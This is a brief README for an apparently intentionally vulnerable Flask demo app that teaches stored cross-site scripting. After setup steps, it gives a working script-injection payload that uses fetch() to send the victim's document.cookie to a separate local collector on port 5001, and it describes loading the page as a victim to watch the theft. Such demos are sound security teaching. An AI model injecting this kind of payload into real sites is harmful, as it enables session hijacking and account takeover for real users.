# Cross-Site Scripting Example

Install `flask`:

```sh
python -m pip install flask
```

Run the app:

```
python app.py
```

You can input something in the text field and press "Submit".
You will then be redirected to `http://localhost:5000/search?query=$QUERY`.

Exploit it by going to `localhost:5000` as the attacker and inserting this comment:

```
<script>fetch(`http://localhost:5001/steal-cookie?cookie=${document.cookie}`)</script>
```

Now load `localhost:5000` as the victim (e.g. on another browser) and observe that your cookies will be stolen.
